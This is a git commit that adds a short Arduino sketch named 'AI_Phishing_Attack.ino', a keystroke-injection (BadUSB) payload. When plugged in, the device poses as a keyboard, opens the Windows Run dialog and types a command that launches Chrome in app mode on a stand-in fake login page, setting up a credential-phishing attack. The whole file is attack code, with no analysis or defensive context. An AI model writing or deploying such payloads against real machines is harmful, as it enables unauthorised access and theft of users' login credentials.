9aeadbbbb8a18dde1e9ecd2e363719d4c4c93fba
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 23:33:36 +0330

    Create AI_Phishing_Attack.ino

---
+++ sketches/AI_Phishing_Attack.ino
@@ -0,0 +1,15 @@
+#include <USBHIDKeyboard.h>
+USBHIDKeyboard Keyboard;
+
+void setup() {
+  Keyboard.begin();
+  delay(3000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println(F("start chrome.exe --app=https://fake-login-page.com"));
+}
+
+void loop() {}
